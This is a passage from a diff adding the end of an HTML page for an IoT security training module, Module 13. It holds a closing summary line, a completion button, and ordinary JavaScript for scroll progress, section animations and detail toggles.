+                injection, IoT network protocols including MQTT, CoAP, and UPnP, and a complete
+                IoT assessment methodology with lab setup and reporting guidelines.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 13
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    function initSectionAnimations() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    function toggleDetail(header) {
+        const body = header.nextElementSibling;
+        const toggle = header.querySelector('.detail-toggle');
+        const isOpen = body.classList.contains('open');
+        body.classList.toggle('open', !isOpen);
+        toggle.classList.toggle('open', !isOpen);
+    }
+
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-mod-iot', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initSectionAnimations();
+    });
+</script>
+
+</body>
+</html>
